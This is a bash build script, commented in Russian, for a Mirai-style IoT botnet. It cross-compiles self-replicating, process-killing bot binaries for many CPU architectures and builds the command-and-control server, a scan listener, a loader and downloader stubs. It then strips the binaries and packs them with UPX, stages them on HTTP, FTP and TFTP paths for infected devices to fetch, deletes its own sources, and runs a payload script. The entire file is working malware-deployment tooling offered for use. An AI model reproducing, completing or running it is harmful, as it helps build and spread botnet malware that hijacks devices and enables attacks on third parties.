#!/bin/bash
echo "Export bin"

# Предполагается, что до запуска этого скрипта уже выполнены:
#   cd /tmp
#   wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
#   sha256sum go1.13.linux-amd64.tar.gz
#   sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
#   export PATH=$PATH:/usr/local/go/bin
#   export GOROOT=/usr/local/go
#   export GOPATH=$HOME/Projects/Proj1
#   export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
#
# Добавляем пути к кросс-компиляторам (если они установлены в /etc/xcompile/...)
export PATH=$PATH:/etc/xcompile/arc/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/i486/bin:/etc/xcompile/i586/bin:/etc/xcompile/i686/bin:/etc/xcompile/m68k/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/sh4/bin:/etc/xcompile/sparc/bin:/etc/xcompile/x86_64/bin

# Очищаем кэш модулей (чтобы убрать ранее скачанные версии, например v1.1.0)

# Если каталог с исходниками CNC существует, настраиваем модуль с нужными зависимостями

# Функции сборки ботов
compile_bot() {
    if ! command -v "$1-gcc" &>/dev/null; then
        echo "Compiler $1-gcc not found, skipping $1 build."
        return
    fi
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
        -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    if command -v "$1-strip" &>/dev/null; then
        "$1-strip" release/"$2" -S --strip-unneeded \
            --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note \
            --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr \
            --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr \
            --remove-section=.eh_frame_hdr
    else
        echo "Strip command $1-strip not found."
    fi
}

compile_bot_arm7() {
    if ! command -v "$1-gcc" &>/dev/null; then
        echo "Compiler $1-gcc not found, skipping $1 build."
        return
    fi
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
        -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

arc_compile() {
    if ! command -v "$1-linux-gcc" &>/dev/null; then
        echo "Compiler $1-linux-gcc not found, skipping arc build."
        return
    fi
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
        -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    if command -v "$1-linux-strip" &>/dev/null; then
        "$1-linux-strip" release/"$2" -S --strip-unneeded \
            --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note \
            --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr \
            --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr \
            --remove-section=.eh_frame_hdr
    else
        echo "Strip command $1-linux-strip not found."
    fi
}

# Подготовка директорий
mkdir -p /root/dlr/release
mkdir -p /root/loader/bins
rm -rf /root/release
mkdir -p /root/release
rm -rf /var/www/html /var/lib/tftpboot /var/ftp
mkdir -p /var/ftp /var/lib/tftpboot /var/www/html/Vye32GsS2g38eKHmaKrLdDjgrnf2YBT4

# Сборка CNC-бинарника (исходники из /root/cnc, где настроен модуль)
go build -o /root/loader/cnc /root/cnc/*.go
rm -rf /root/cnc
mv /root/loader/cnc /root || echo "CNC binary not found."

# Сборка scanListen
go build -o /root/loader/scanListen scanListen.go

# Кросс-компиляция ботов (если соответствующие компиляторы есть)
echo "Building - x86"
compile_bot i586 FGx8SNCa4txePA.x86 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - i486"
compile_bot i486 FGx8SNCa4txePA.i486 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - i686"
compile_bot i686 FGx8SNCa4txePA.i686 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - mips"
compile_bot mips FGx8SNCa4txePA.mips "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - mipsel"
compile_bot mipsel FGx8SNCa4txePA.mpsl "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv4l"
compile_bot armv4l FGx8SNCa4txePA.arm "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv5l"
compile_bot armv5l FGx8SNCa4txePA.arm5 "-DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv6l"
compile_bot armv6l FGx8SNCa4txePA.arm6 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv7l"
compile_bot_arm7 armv7l FGx8SNCa4txePA.arm7 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - powerpc"
compile_bot powerpc FGx8SNCa4txePA.ppc "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - sparc"
compile_bot sparc FGx8SNCa4txePA.spc "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - m68k"
compile_bot m68k FGx8SNCa4txePA.m68k "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - sh4"
compile_bot sh4 FGx8SNCa4txePA.sh4 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - x86_64"
compile_bot x86_64 FGx8SNCa4txePA.x86_64 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - arc"
arc_compile arc FGx8SNCa4txePA.arc "-static -DKILLER -DSELFREP -DWATCHDOG"

# Распространение бинарников ботов (если они собраны)
cp release/FGx8SNCa4txePA.* /var/www/html/Vye32GsS2g38eKHmaKrLdDjgrnf2YBT4 2>/dev/null
cp release/FGx8SNCa4txePA.* /var/ftp 2>/dev/null
mv release/FGx8SNCa4txePA.* /var/lib/tftpboot 2>/dev/null
rm -rf release

echo "Building loader"
gcc -static -O3 -lpthread -pthread /root/loader/src/*.c -o /root/loader/loader

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.x86
i486-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.i486
i686-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.i686
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.spc
x86_64-gcc -Os -D BOT_ARCH=\"x86_64\" -D X86_64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/dlr/main.c -o /root/dlr/release/dlr.x86_64

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.x86
i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.i486
i686-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.i686
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.spc
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/dlr/release/dlr.x86_64

# Перемещаем DLR-бинарники в /root/loader/bins и чистим временные файлы

mv /root/dlr/release/dlr.* /root/loader/bins 2>/dev/null

rm -rf /root/dlr /root/loader/src /root/bot /root/scanListen.go /root/Projects /root/build.sh

# UPX-сжатие
wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf upx-3.94-i386_linux.tar.xz
mv upx*/upx .
if [ -f "./upx" ]; then
    ./upx --ultra-brute /var/www/html/Vye32GsS2g38eKHmaKrLdDjgrnf2YBT4/*
    ./upx --ultra-brute /var/lib/tftpboot/*
    ./upx --ultra-brute /var/ftp/*
    rm -rf upx*
else
    echo "UPX not found."
fi

# Запуск python-скрипта для payload
if command -v python &>/dev/null; then
    python payload.py
    rm -rf payload.py
else
    echo "Python not found."
fi
